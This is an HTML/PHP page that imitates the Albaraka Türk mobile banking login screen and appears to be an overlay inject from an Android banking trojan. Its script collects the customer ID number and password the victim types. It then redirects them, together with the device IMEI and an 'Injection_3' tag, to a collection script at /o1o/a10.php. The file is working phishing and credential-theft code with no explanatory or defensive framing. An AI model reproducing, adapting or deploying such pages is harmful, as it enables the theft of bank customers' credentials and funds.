<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.pozitron.albarakaturk/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header" >
			<img width="30px" src="tr/com.pozitron.albarakaturk/user.png">
			<img width="40%" style="margin-left: 60px; " src="tr/com.pozitron.albarakaturk/logo.png">
			<img width="30px" style="margin-left: 40px; " src="tr/com.pozitron.albarakaturk/tell.png">
			<img width="30px" style="margin-left: 10px; " src="tr/com.pozitron.albarakaturk/bell.png">
    </div>
    <div class="content">
        <form method="post">
			<p>Müşteri / TC Kimlik Numarası</p>
            <input type="text" class="login" name="login" id="login" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="">
			<p>Şifre</p>
            <input type="password" class="password" name="password" id="password" placeholder="">

            <input type="submit" class="submit" onclick="sentServer1();" id="sbt_input" value="Giriş">
			<div class="text">
                  <u>Yeni Üyelik</u>
            </div>

            <div class="text" style="text-align: center;">
                <u>Şifremi Unuttum</u>
            </div>
        </form>
		<br><br> <br>
    </div>

  <script type="text/javascript">


  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'login';
							oCodeInp.className = 'password';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'loginerror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'passworderror';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|albarakaturk|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</body>
</html>
